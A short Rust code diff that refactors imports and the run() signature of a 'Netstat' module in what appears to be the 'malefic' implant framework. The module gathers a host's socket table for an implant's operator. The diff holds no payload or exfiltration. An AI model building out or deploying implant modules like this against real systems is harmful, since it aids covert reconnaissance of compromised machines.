@@ -1,9 +1,5 @@
-use crate::{check_request, Module, ModuleImpl, Result, TaskResult};
-use malefic_proto::proto::implantpb::{spite::Body};
-use async_trait::async_trait;
 use malefic_proto::proto::modulepb::{NetstatResponse, SockTabEntry};
-use malefic_trait::module_impl;
-
+use crate::prelude::*;
 pub struct Netstat {}
 
 
@@ -13,7 +9,7 @@ impl Module for Netstat {}
 
 #[async_trait]
 impl ModuleImpl for Netstat {
-    async fn run(&mut self, id: u32, receiver: &mut crate::Input, _sender: &mut crate::Output) -> Result {
+    async fn run(&mut self, id: u32, receiver: &mut malefic_proto::module::Input, _sender: &mut malefic_proto::module::Output) -> ModuleResult {
         let _re = check_request!(receiver, Body::Request)?;
 
         let mut response = NetstatResponse::default();
